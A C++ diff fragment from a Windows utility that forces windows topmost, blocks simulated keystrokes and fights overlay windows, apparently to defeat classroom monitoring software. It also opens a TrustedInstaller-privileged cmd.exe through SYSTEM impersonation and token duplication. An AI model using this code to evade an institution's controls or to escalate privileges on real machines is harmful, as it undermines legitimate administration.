+            return 1; // 拦截模拟按键
+        }
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+// 键盘钩子线程：维护消息泵（WH_KEYBOARD_LL 必须运行在消息循环中）
+static void KeyboardHookThreadFunc() {
+    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardHookProc,
+        GetModuleHandleW(NULL), 0);
+    
+    if (!g_hKeyboardHook) {
+        g_keyboardHookRunning = false;
+        return;
+    }
+    
+    MSG msg;
+    while (g_keyboardHookRunning) {
+        DWORD result = MsgWaitForMultipleObjects(0, NULL, FALSE, 10, QS_ALLINPUT);
+        if (result == WAIT_OBJECT_0) {
+            while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
+                TranslateMessage(&msg);
+                DispatchMessageW(&msg);
+            }
+        }
+    }
+    
+    if (g_hKeyboardHook) {
+        UnhookWindowsHookEx(g_hKeyboardHook);
+        g_hKeyboardHook = NULL;
+    }
+}
+
+// ===================================================================
+// 主置顶线程函数
+// ===================================================================
+
+void AlwaysOnTopThreadFunc() {
+    
+    // === 在当前线程安装 WinEvent Hook（需要消息泵，见下方）===
+    if (!g_hWinEventHookForeground) {
+        g_hWinEventHookForeground = SetWinEventHook(
+            EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
+            NULL, TopmostWinEventProc, 0, 0,
+            WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
+    }
+    if (!g_hWinEventHookMinimize) {
+        g_hWinEventHookMinimize = SetWinEventHook(
+            EVENT_SYSTEM_MINIMIZESTART, EVENT_SYSTEM_MINIMIZEEND,
+            NULL, TopmostWinEventProc, 0, 0,
+            WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
+    }
+    if (!g_hWinEventHookDestroy) {
+        g_hWinEventHookDestroy = SetWinEventHook(
+            EVENT_OBJECT_DESTROY, EVENT_OBJECT_DESTROY,
+            NULL, TopmostWinEventProc, 0, 0,
+            WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
+    }
+    if (!g_hWinEventHookCreate) {
+        g_hWinEventHookCreate = SetWinEventHook(
+            EVENT_OBJECT_CREATE, EVENT_OBJECT_SHOW,
+            NULL, TopmostWinEventProc, 0, 0,
+            WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
+    }
+    
+    // 辅助功能定时器
+    DWORD lastInputCheck = 0;
+    DWORD lastOverlayCheck = 0;
+    DWORD lastFullscreenCheck = 0;
+    DWORD lastFocusCheck = 0;
+    DWORD lastTopmostCheck = 0;
+    DWORD lastDesktopCheck = 0;
+    DWORD lastDesktopRestore = 0;  // 桌面恢复独立计时（高频）
+    
+    // 上次成功置顶的窗口
+    HWND lastTopmostWindow = NULL;
+    DWORD lastTopmostTime = 0;
+    
+    while (g_alwaysOnTopEnabled) {
+        DWORD currentTime = GetTickCount();
+        
+        // 键盘鼠标恢复（10ms一次）
+        if (currentTime - lastInputCheck > 10) {
+            RestoreInputDevices();
+            lastInputCheck = currentTime;
+        }
+        
+        // 桌面环境恢复（200ms一次，高频对抗黑屏覆盖层）
+        if (currentTime - lastDesktopRestore > 200) {
+            RestoreDesktopQuick();
+            lastDesktopRestore = currentTime;
+        }
+        
+        // 虚拟桌面检测（100ms一次）
+        if (currentTime - lastDesktopCheck > 100) {
+            DetectAndSwitchToOriginalDesktop();
+            lastDesktopCheck = currentTime;
+        }
+        
+        // DXGI/GDI全屏覆盖窗口检测（500ms一次，降低频率避免误杀系统窗口）
+        if (currentTime - lastOverlayCheck > 500) {
+            DetectAndMinimizeOverlayWindows();
+            lastOverlayCheck = currentTime;
+        }
+        
+        // F11全屏窗口检测（500ms一次）
+        if (currentTime - lastFullscreenCheck > 500) {
+            DetectAndRestoreFullscreenWindows();
+            lastFullscreenCheck = currentTime;
+        }
+        
+        // 焦点检查
+        if (currentTime - lastFocusCheck > 5) {
+            lastFocusCheck = currentTime;
+        }
+        
+        HWND hwnd = NULL;
+
+        if (g_targetTopmostWindow && IsWindow(g_targetTopmostWindow)) {
+            hwnd = g_targetTopmostWindow;
+        }
+        else {
+            if (!g_targetWindowClass.empty()) {
+                hwnd = FindWindowW(g_targetWindowClass.c_str(), NULL);
+            }
+            if (!hwnd && !g_targetWindowTitle.empty()) {
+                hwnd = FindWindowW(NULL, g_targetWindowTitle.c_str());
+            }
+            if (!hwnd) {
+                hwnd = GetForegroundWindow();
+            }
+        }
+
+        if (hwnd && IsWindow(hwnd)) {
+            // === 增强：不要误把恶意置顶窗口当成保护目标 ===
+            LONG checkEx = GetWindowLongW(hwnd, GWL_EXSTYLE);
+            if (checkEx & WS_EX_TOPMOST) {
+                // 是我们刚设的TOPMOST还是恶意程序自带的？看时间差
+                if (hwnd != lastTopmostWindow || (currentTime - lastTopmostTime > 100)) {
+                    // 不是我们设的TOPMOST（恶意窗口自带）→ 跳过
+                    // 通过找下一个非置顶窗口来恢复
+                    HWND nextHwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
+                    if (nextHwnd && IsWindow(nextHwnd)) {
+                        DWORD nextPid = 0;
+                        GetWindowThreadProcessId(nextHwnd, &nextPid);
+                        LONG nextEx = GetWindowLongW(nextHwnd, GWL_EXSTYLE);
+                        if (nextPid != GetCurrentProcessId() && !(nextEx & WS_EX_TOPMOST)) {
+                            hwnd = nextHwnd;
+                        }
+                    }
+                }
+            }
+            
+            g_targetTopmostWindow = hwnd;
+            
+            // === 增强：窗口变化时重新子类化 ===
+            if (g_subclassedHwnd != hwnd) {
+                RemoveTopmostSubclass();
+                InstallTopmostSubclass(hwnd);
+            }
+            
+            // 检查当前前台窗口是否是我们要监控的窗口（供后续逻辑使用）
+            // 子类化+WinEvent已处理焦点与覆盖，不再需要此处批量窗口操作
+            // 检查是否是系统对话框（文件选择框等）- 跳过置顶
+            wchar_t className[256] = {};
+            GetClassNameW(hwnd, className, 256);
+            
+            bool isDialogWindow = wcsstr(className, L"#32770") != nullptr ||  // 对话框
+                                wcsstr(className, L"File Dialog") != nullptr ||
+                                wcsstr(className, L"OpenFileDialog") != nullptr ||
+                                wcsstr(className, L"FileOpen") != nullptr ||
+                                wcsstr(className, L"File Save") != nullptr ||
+                                wcsstr(className, L"BrowseForFolder") != nullptr;
+            
+            // 检查是否是全屏应用（游戏、视频播放器等）
+            bool isFullscreenApp = false;
+            RECT screenRect;
+            GetWindowRect(GetDesktopWindow(), &screenRect);
+            int screenWidth = screenRect.right - screenRect.left;
+            int screenHeight = screenRect.bottom - screenRect.top;
+            
+            RECT windowRect;
+            if (GetWindowRect(hwnd, &windowRect)) {
+                int windowWidth = windowRect.right - windowRect.left;
+                int windowHeight = windowRect.bottom - windowRect.top;
+                
+                // 如果窗口占据整个屏幕且无边框，可能是全屏应用
+                isFullscreenApp = (windowWidth >= screenWidth && windowHeight >= screenHeight) &&
+                                 ((GetWindowLongPtr(hwnd, GWL_STYLE) & WS_BORDER) == 0);
+            }
+            
+            // 检查窗口是否被禁用
+            bool isWindowEnabled = IsWindowEnabled(hwnd);
+            
+            // 检查窗口是否在屏幕外
+            bool isWindowOnScreen = true;
+            if (GetWindowRect(hwnd, &windowRect)) {
+                isWindowOnScreen = (windowRect.right > 0 && windowRect.bottom > 0 &&
+                                  windowRect.left < screenWidth && windowRect.top < screenHeight);
+            }
+            
+            // 检查窗口大小是否有效
+            bool isValidSize = true;
+            if (GetWindowRect(hwnd, &windowRect)) {
+                int width = windowRect.right - windowRect.left;
+                int height = windowRect.bottom - windowRect.top;
+                isValidSize = (width > 0 && height > 0 && width < 10000 && height < 10000);
+            }
+            
+            // 如果是对话框窗口、全屏应用、禁用窗口、屏幕外窗口或无效大小，不进行置顶操作
+            if (!isDialogWindow && !isFullscreenApp && isWindowEnabled && isWindowOnScreen && isValidSize) {
+                // 强制获取焦点（对抗电子教室的焦点拦截）
+                ForceSetForegroundWindow(hwnd);
+
+                BOOL isIconic = IsIconic(hwnd);
+                BOOL isVisible = IsWindowVisible(hwnd);
+
+                // 如果窗口被最小化或不可见，强制恢复
+                if (isIconic || !isVisible) {
+                    // 强制恢复窗口
+                    ForceSetForegroundWindow(hwnd);
+                    ShowWindow(hwnd, SW_RESTORE);
+                    ShowWindow(hwnd, SW_SHOW);
+                    ShowWindow(hwnd, SW_SHOWNORMAL);
+                    
+                    // 强制激活
+                    ForceSetForegroundWindow(hwnd);
+                    
+                    WINDOWPLACEMENT wp = { sizeof(wp) };
+                    if (GetWindowPlacement(hwnd, &wp)) {
+                        wp.showCmd = SW_SHOWNORMAL;
+                        SetWindowPlacement(hwnd, &wp);
+                    }
+                }
+
+                RECT rect;
+                if (GetWindowRect(hwnd, &rect)) {
+                    int width = rect.right - rect.left;
+                    int height = rect.bottom - rect.top;
+                    
+                    if (width > 0 && height > 0) {
+                        // === 增强：战斗模式感知的置顶检查 ===
+                        
+                        // 检查战斗模式状态：2秒无事件自动退出
+                        bool inFightMode = (InterlockedCompareExchange(&g_topmostFightMode, 0, 0) != 0);
+                        if (inFightMode) {
+                            DWORD timeSinceFight = currentTime - g_lastTopmostFightTime;
+                            if (timeSinceFight > 2000) {
+                                InterlockedExchange(&g_topmostFightMode, 0);
+                                inFightMode = false;
+                            }
+                        }
+                        
+                        // 使用 GWL_EXSTYLE 可靠检测 TOPMOST 状态（比 GW_HWNDPREV 准确得多）
+                        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+                        bool hasTopmostStyle = (exStyle & WS_EX_TOPMOST) != 0;
+                        
+                        // 战斗模式：无冷却期，每次循环都强制置顶；正常模式：500ms冷却期
+                        bool needSetTopmost = !hasTopmostStyle || inFightMode || 
+                            (currentTime - lastTopmostTime >= 500);
+                        
+                        if (needSetTopmost) {
+                            // === 增强：先用 SetWindowLong 强制写入 TOPMOST 样式 ===
+                            if (!hasTopmostStyle) {
+                                SetWindowLongW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_TOPMOST);
+                            }
+                            
+                            // 强制置顶
+                            SetWindowPos(hwnd, HWND_TOPMOST, 
+                                rect.left, rect.top, width, height,
+                                SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
+                            
+                            lastTopmostWindow = hwnd;
+                            lastTopmostTime = currentTime;
+                            
+                            ForceSetForegroundWindow(hwnd);
+                            
+                            // === 增强：战斗模式下更高频率重复置顶 ===
+                            int repeatCount = inFightMode ? 30 : 3;
+                            for (int i = 0; i < repeatCount; i++) {
+                                SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, 
+                                    SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE | SWP_ASYNCWINDOWPOS);
+                                if (i % 3 == 0) {
+                                    ForceSetForegroundWindow(hwnd);
+                                }
+                            }
+                            
+                            // === 增强：战斗模式下降级所有非目标窗口 ===
+                            if (inFightMode) {
+                                ForceStripAllCompetitors(hwnd);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // === 增强：消息泵 + 轮询延迟（WinEvent Hook 的回调需要消息泵才能触发）===
+        bool inFight = (InterlockedCompareExchange(&g_topmostFightMode, 0, 0) != 0);
+        DWORD waitTime = inFight ? 5 : 10;
+        
+        MSG msg;
+        DWORD result = MsgWaitForMultipleObjects(0, NULL, FALSE, waitTime, QS_ALLINPUT);
+        if (result == WAIT_OBJECT_0) {
+            while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
+                TranslateMessage(&msg);
+                DispatchMessageW(&msg);
+            }
+        }
+    }
+
+    g_targetTopmostWindow = NULL;
+    g_hasOriginalPlacement = false;
+    lastTopmostWindow = NULL;
+    
+    // 停止最小化最上方窗口线程
+    g_minimizeTopWindowEnabled = false;
+    if (g_minimizeTopWindowThread.joinable()) {
+        auto startTime = std::chrono::steady_clock::now();
+        while (g_minimizeTopWindowThread.joinable()) {
+            auto currentTime = std::chrono::steady_clock::now();
+            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(currentTime - startTime).count();
+            
+            if (elapsed > 500) {
+                // 超时，强制detach线程
+                g_minimizeTopWindowThread.detach();
+                break;
+            }
+            
+            // 检查线程是否已经结束
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        }
+        
+        // 如果线程已经结束，join它
+        if (g_minimizeTopWindowThread.joinable()) {
+            g_minimizeTopWindowThread.join();
+        }
+    }
+}
+
+// 启动窗口置顶功能
+void StartAlwaysOnTop() {
+    if (g_alwaysOnTopEnabled) {
+        std::wcout << L"强制置顶功能已经在运行中" << std::endl;
+        return;
+    }
+
+    // 初始化桌面防护
+    InitDesktopProtection();
+
+    g_alwaysOnTopEnabled = true;
+    g_topmostFightMode = 0;
+    g_targetTopmostWindow = GetForegroundWindow();
+    
+    // 不要把本程序自己的窗口设为目标
+    if (g_targetTopmostWindow) {
+        DWORD initPid = 0;
+        GetWindowThreadProcessId(g_targetTopmostWindow, &initPid);
+        if (initPid == GetCurrentProcessId()) {
+            g_targetTopmostWindow = NULL;
+        }
+    }
+    
+    // === 增强：子类化目标窗口（消息级拦截最小化/Z序变化）===
+    if (g_targetTopmostWindow && IsWindow(g_targetTopmostWindow)) {
+        InstallTopmostSubclass(g_targetTopmostWindow);
+        
+        // 立即强制 TOPMOST 样式
+        LONG exStyle = GetWindowLongW(g_targetTopmostWindow, GWL_EXSTYLE);
+        SetWindowLongW(g_targetTopmostWindow, GWL_EXSTYLE, exStyle | WS_EX_TOPMOST);
+        SetWindowPos(g_targetTopmostWindow, HWND_TOPMOST, 0, 0, 0, 0,
+            SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
+        ForceSetForegroundWindow(g_targetTopmostWindow);
+    }
+    
+    g_alwaysOnTopThread = std::thread(AlwaysOnTopThreadFunc);
+    
+    // === 增强：启动时重置显示模式，破坏已存在的DWM/DirectX覆盖层 ===
+    EnablePrivilege(SE_DEBUG_NAME);
+    DEVMODE resetDM = {0};
+    resetDM.dmSize = sizeof(resetDM);
+    if (EnumDisplaySettingsW(NULL, ENUM_CURRENT_SETTINGS, &resetDM)) {
+        ChangeDisplaySettingsW(&resetDM, CDS_RESET);
+    }
+    
+    // === 增强：安装低层键盘钩子阻止其他程序模拟输入 ===
+    if (!g_keyboardHookRunning) {
+        g_keyboardHookRunning = true;
+        g_keyboardHookThread = std::thread(KeyboardHookThreadFunc);
+    }
+    
+    // 启动最小化最上方窗口线程
+    if (!g_minimizeTopWindowEnabled) {
+        g_minimizeTopWindowEnabled = true;
+        g_minimizeTopWindowThread = std::thread(MinimizeTopWindowThreadFunc);
+    }
+}
+
+// 设置需要置顶的目标窗口
+void SetTopmostTarget(HWND hwnd) {
+    if (hwnd && IsWindow(hwnd)) {
+        // === 增强：重新子类化新窗口 ===
+        if (g_subclassedHwnd != hwnd) {
+            RemoveTopmostSubclass();
+            InstallTopmostSubclass(hwnd);
+        }
+        
+        g_targetTopmostWindow = hwnd;
+        EnsureFocusOnTarget(hwnd);
+        
+        // === 增强：强制写入 GWL_EXSTYLE TOPMOST ===
+        LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
+        SetWindowLongW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_TOPMOST);
+        
+        RECT rect;
+        if (GetWindowRect(hwnd, &rect)) {
+            SetWindowPos(hwnd, HWND_TOPMOST, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top,
+                SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
+        }
+        EnsureFocusOnTarget(hwnd);
+    }
+}
+
+// 设置置顶目标窗口类名
+void SetTopmostTargetByClass(const std::wstring& windowClass) {
+    g_targetWindowClass = windowClass;
+    g_targetTopmostWindow = FindWindowW(windowClass.c_str(), NULL);
+    if (g_targetTopmostWindow && IsWindow(g_targetTopmostWindow)) {
+        // === 增强：重新子类化新窗口 ===
+        if (g_subclassedHwnd != g_targetTopmostWindow) {
+            RemoveTopmostSubclass();
+            InstallTopmostSubclass(g_targetTopmostWindow);
+        }
+        
+        EnsureFocusOnTarget(g_targetTopmostWindow);
+        
+        // === 增强：强制写入 GWL_EXSTYLE TOPMOST ===
+        LONG exStyle = GetWindowLongW(g_targetTopmostWindow, GWL_EXSTYLE);
+        SetWindowLongW(g_targetTopmostWindow, GWL_EXSTYLE, exStyle | WS_EX_TOPMOST);
+        
+        SetWindowPos(g_targetTopmostWindow, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
+        EnsureFocusOnTarget(g_targetTopmostWindow);
+    }
+}
+
+// 停止窗口置顶功能
+void StopAlwaysOnTop() {
+    if (!g_alwaysOnTopEnabled) {
+        std::wcout << L"强制置顶功能未在运行" << std::endl;
+        return;
+    }
+
+    g_alwaysOnTopEnabled = false;
+    g_topmostFightMode = 0;
+    g_targetWindowClass.clear();
+    g_targetWindowTitle.clear();
+
+    // === 增强：卸载 WinEvent Hook ===
+    if (g_hWinEventHookForeground) {
+        UnhookWinEvent(g_hWinEventHookForeground);
+        g_hWinEventHookForeground = NULL;
+    }
+    if (g_hWinEventHookMinimize) {
+        UnhookWinEvent(g_hWinEventHookMinimize);
+        g_hWinEventHookMinimize = NULL;
+    }
+    if (g_hWinEventHookDestroy) {
+        UnhookWinEvent(g_hWinEventHookDestroy);
+        g_hWinEventHookDestroy = NULL;
+    }
+    if (g_hWinEventHookCreate) {
+        UnhookWinEvent(g_hWinEventHookCreate);
+        g_hWinEventHookCreate = NULL;
+    }
+    
+    // === 增强：解除窗口子类化 ===
+    RemoveTopmostSubclass();
+
+    // === 增强：卸载键盘钩子 ===
+    g_keyboardHookRunning = false;
+    if (g_keyboardHookThread.joinable()) {
+        g_keyboardHookThread.join();
+    }
+
+    // 等待线程结束，最多等待2秒
+    if (g_alwaysOnTopThread.joinable()) {
+        auto startTime = std::chrono::steady_clock::now();
+        while (g_alwaysOnTopThread.joinable()) {
+            auto currentTime = std::chrono::steady_clock::now();
+            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(currentTime - startTime).count();
+            
+            if (elapsed > 500) {
+                // 超时，强制detach线程
+                g_alwaysOnTopThread.detach();
+                break;
+            }
+            
+            // 检查线程是否已经结束
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        }
+        
+        // 如果线程已经结束，join它
+        if (g_alwaysOnTopThread.joinable()) {
+            g_alwaysOnTopThread.join();
+        }
+    }
+
+    if (g_targetTopmostWindow && IsWindow(g_targetTopmostWindow)) {
+        if (g_hasOriginalPlacement) {
+            SetWindowPlacement(g_targetTopmostWindow, &g_originalPlacement);
+        }
+        SetWindowPos(g_targetTopmostWindow, HWND_NOTOPMOST, 0, 0, 0, 0, 
+            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
+    }
+
+    // 使用更安全的方式枚举窗口，避免卡住
+    HWND hwnd = GetTopWindow(NULL);
+    int windowCount = 0;
+    const int maxWindows = 1000; // 最多处理1000个窗口，避免卡住
+    
+    while (hwnd && windowCount < maxWindows) {
+        if (IsWindow(hwnd) && IsWindowVisible(hwnd)) {
+            SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
+        }
+        hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
+        windowCount++;
+    }
+
+    g_targetTopmostWindow = NULL;
+    g_hasOriginalPlacement = false;
+    
+    // 清理桌面防护
+    CleanupDesktopProtection();
+
+    std::wcout << L"强制置顶功能已停止" << std::endl;
+}
+
+HWND FindWindowByProcessId(DWORD processId) {
+    if (processId == 0) return NULL;
+    
+    HWND hwnd = FindWindowExW(NULL, NULL, NULL, NULL);
+    while (hwnd) {
+        DWORD windowPid = 0;
+        if (GetWindowThreadProcessId(hwnd, &windowPid) && windowPid == processId) {
+            if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
+                return hwnd;
+            }
+        }
+        hwnd = FindWindowExW(NULL, hwnd, NULL, NULL);
+    }
+    return NULL;
+}
+
+HWND FindTopLevelWindowByProcessId(DWORD processId, int maxRetries = 5) {
+    if (processId == 0) return NULL;
+    
+    for (int retry = 0; retry < maxRetries; retry++) {
+        HWND hwnd = FindWindowExW(NULL, NULL, NULL, NULL);
+        HWND bestHwnd = NULL;
+        
+        while (hwnd) {
+            DWORD windowPid = 0;
+            if (GetWindowThreadProcessId(hwnd, &windowPid) && windowPid == processId) {
+                WINDOWPLACEMENT wp = { sizeof(wp) };
+                if (GetWindowPlacement(hwnd, &wp)) {
+                    if (IsWindowVisible(hwnd) && 
+                        (wp.showCmd == SW_SHOWNORMAL || wp.showCmd == SW_SHOWMAXIMIZED || wp.showCmd == SW_RESTORE)) {
+                        HWND parent = GetParent(hwnd);
+                        if (parent == NULL) {
+                            return hwnd;
+                        }
+                        if (!bestHwnd) {
+                            bestHwnd = hwnd;
+                        }
+                    }
+                }
+            }
+            hwnd = FindWindowExW(NULL, hwnd, NULL, NULL);
+        }
+        
+        if (bestHwnd) return bestHwnd;
+        
+        if (retry < maxRetries - 1) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        }
+    }
+    
+    return NULL;
+}
+
+void PreventMinimizeThreadFunc(HWND hwnd, DWORD processId, std::atomic<bool>& running, const wchar_t* windowClass = nullptr) {
+    WINDOWPLACEMENT originalPlacement = { sizeof(WINDOWPLACEMENT) };
+    bool hasOriginalPlacement = false;
+    int restoreAttempts = 0;
+
+    while (running) {
+        if (hwnd && IsWindow(hwnd)) {
+            BOOL isVisible = IsWindowVisible(hwnd);
+            if (!isVisible) {
+                ShowWindow(hwnd, SW_SHOW);
+                std::this_thread::sleep_for(std::chrono::milliseconds(1));
+            }
+
+            WINDOWPLACEMENT wp = { sizeof(wp) };
+            if (GetWindowPlacement(hwnd, &wp)) {
+                if (!hasOriginalPlacement && (wp.showCmd == SW_SHOWNORMAL || wp.showCmd == SW_SHOWMAXIMIZED)) {
+                    originalPlacement = wp;
+                    hasOriginalPlacement = true;
+                }
+
+                if (wp.showCmd == SW_MINIMIZE || wp.showCmd == SW_SHOWMINIMIZED || wp.showCmd == SW_FORCEMINIMIZE || wp.showCmd == SW_HIDE) {
+                    restoreAttempts++;
+                    
+                    ShowWindow(hwnd, SW_RESTORE);
+                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                    
+                    if (GetWindowPlacement(hwnd, &wp)) {
+                        wp.showCmd = SW_SHOWNORMAL;
+                        wp.flags = 0;
+                        wp.ptMinPosition.x = -1;
+                        wp.ptMinPosition.y = -1;
+                        wp.ptMaxPosition.x = -1;
+                        wp.ptMaxPosition.y = -1;
+                        wp.rcNormalPosition.left = wp.rcNormalPosition.left;
+                        wp.rcNormalPosition.top = wp.rcNormalPosition.top;
+                        wp.rcNormalPosition.right = wp.rcNormalPosition.right;
+                        wp.rcNormalPosition.bottom = wp.rcNormalPosition.bottom;
+                        SetWindowPlacement(hwnd, &wp);
+                    }
+                    
+                    if (restoreAttempts % 2 == 0) {
+                        ShowWindow(hwnd, SW_SHOWMAXIMIZED);
+                        std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                        ShowWindow(hwnd, SW_RESTORE);
+                    }
+                }
+                else if (wp.showCmd == SW_SHOWMAXIMIZED) {
+                    ShowWindow(hwnd, SW_RESTORE);
+                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                    if (GetWindowPlacement(hwnd, &wp)) {
+                        wp.showCmd = SW_SHOWNORMAL;
+                        SetWindowPlacement(hwnd, &wp);
+                    }
+                }
+            }
+
+            RECT rect;
+            if (GetWindowRect(hwnd, &rect)) {
+                int width = rect.right - rect.left;
+                int height = rect.bottom - rect.top;
+                
+                if (width > 0 && height > 0) {
+                    for (int i = 0; i < 3; i++) {
+                        SetWindowPos(hwnd, HWND_TOPMOST, 
+                            rect.left, rect.top, width, height,
+                            SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
+                    }
+                }
+            }
+        }
+        else {
+            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
+            if (!hProcess || WaitForSingleObject(hProcess, 0) == WAIT_OBJECT_0) {
+                running = false;
+                if (hProcess) CloseHandle(hProcess);
+                break;
+            }
+            CloseHandle(hProcess);
+
+            if (windowClass) {
+                HWND newHwnd = FindWindow(windowClass, nullptr);
+                if (newHwnd && IsWindow(newHwnd)) {
+                    hwnd = newHwnd;
+                    restoreAttempts = 0;
+                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
+                    continue;
+                }
+            }
+            else {
+                HWND newHwnd = FindTopLevelWindowByProcessId(processId, 3);
+                if (newHwnd && IsWindow(newHwnd)) {
+                    hwnd = newHwnd;
+                    restoreAttempts = 0;
+                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
+                    continue;
+                }
+            }
+        }
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+}
+
+// 打开TrustedInstaller权限的CMD
+void OpenTrustedInstallerCMD() {
+    DMSP_VERIFY(0x2004);  // TI CMD子函数 - 二级验证
+    try {
+        EnablePrivilege(SE_DEBUG_NAME);
+        EnablePrivilege(SE_IMPERSONATE_NAME);
+        ImpersonateSystem();
+        auto pid = StartTrustedInstallerService();
+
+        HandlePtr hTIProcess(OpenProcess(
+            PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
+            FALSE,
+            pid));
+
+        if (!hTIProcess) {
+            throw WindowsException("OpenProcess failed (TrustedInstaller.exe)");
+        }
+
+        HandlePtr hTIToken(nullptr);
+        HANDLE rawTIToken;
+        if (!OpenProcessToken(
+            hTIProcess.get(),
+            MAXIMUM_ALLOWED,
+            &rawTIToken)) {
+            throw WindowsException("OpenProcessToken failed (TrustedInstaller.exe)");
+        }
+        hTIToken.reset(rawTIToken);
+
+        HandlePtr hDupToken(nullptr);
+        HANDLE rawDupToken;
+        SECURITY_ATTRIBUTES tokenAttributes = { 0 };
+        tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
+        tokenAttributes.lpSecurityDescriptor = nullptr;
+        tokenAttributes.bInheritHandle = FALSE;
+
+        if (!DuplicateTokenEx(
+            hTIToken.get(),
+            MAXIMUM_ALLOWED,
+            &tokenAttributes,
+            SecurityImpersonation,
+            TokenImpersonation,
+            &rawDupToken)) {
+            throw WindowsException("DuplicateTokenEx failed (TrustedInstaller.exe)");
+        }
+        hDupToken.reset(rawDupToken);
+
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi = { 0 };
+        
+        wchar_t cmdPath[MAX_PATH];
+        GetSystemDirectoryW(cmdPath, MAX_PATH);
+        wcscat_s(cmdPath, L"\\cmd.exe");
+        
+        DWORD creationFlags = CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT;
+        DWORD dwLogonFlags = IsWindows7OrLater() ? LOGON_WITH_PROFILE : 0;
+        
+        if (!AdvancedProcessCreator::CreateProcessWithToken(
+            hDupToken.get(),
+            dwLogonFlags,
+            cmdPath,
+            NULL,
+            creationFlags,
+            NULL,
+            NULL,
+            &si,
+            &pi)) {
+            DWORD error = GetLastError();
+            if (error == ERROR_FILE_NOT_FOUND) {
+                std::wcout << L"cmd.exe文件不存在" << std::endl;
+            }
+            else if (error == ERROR_ACCESS_DENIED) {
+                std::wcout << L"拒绝访问，无法启动CMD" << std::endl;
+            }
+            else {
+                std::wcout << L"启动CMD失败，错误码: " << error << std::endl;
+            }
+            if (pi.hThread) CloseHandle(pi.hThread);
+            if (pi.hProcess && pi.hProcess != INVALID_HANDLE_VALUE) CloseHandle(pi.hProcess);
+            return;
+        }
+
+        std::wcout << L"已启动CMD" << std::endl;
+
+        DWORD processId = pi.dwProcessId;
+        HANDLE hProcess = pi.hProcess;
+
+        if (processId && hProcess) {
+            CloseHandle(pi.hThread);
+
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+
+            HWND hwnd = FindTopLevelWindowByProcessId(processId, 10);
+            if (hwnd) {
+                RECT rect;
+                if (GetWindowRect(hwnd, &rect)) {
+                    SetWindowPos(hwnd, HWND_TOP, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top,
+                        SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
+                }
+                std::wcout << L"CMD窗口已置顶" << std::endl;
+
+                std::atomic<bool> monitorRunning(true);
+                std::thread monitorThread([hwnd, processId, &monitorRunning]() {
+                    PreventMinimizeThreadFunc(hwnd, processId, monitorRunning, nullptr);
+                });
+                monitorThread.detach();
+            }
+            else {
+                std::wcout << L"未找到CMD窗口，监控功能不可用" << std::endl;
+            }
+
+            CloseHandle(hProcess);
+        }
+        else {
+            std::wcout << L"无法获取进程ID，监控功能不可用" << std::endl;
+            if (pi.hThread) CloseHandle(pi.hThread);
+            if (hProcess && hProcess != INVALID_HANDLE_VALUE) CloseHandle(hProcess);
+        }
+    }
+    catch (const std::exception& e) {
+        std::wcerr << L"启动TrustedInstaller权限的CMD失败: " << e.what() << std::endl;
+    }
+}
+
+std::set<DWORD> GetChildProcesses(DWORD parentPid) {
+    std::set<DWORD> childPids;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        return childPids;
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hSnapshot, &pe32)) {
+        do {
+            if (pe32.th32ParentProcessID == parentPid) {
+                childPids.insert(pe32.th32ProcessID);
+                // 递归获取孙子进程
+                auto grandchildren = GetChildProcesses(pe32.th32ProcessID);
+                childPids.insert(grandchildren.begin(), grandchildren.end());
+            }
+        } while (Process32Next(hSnapshot, &pe32));
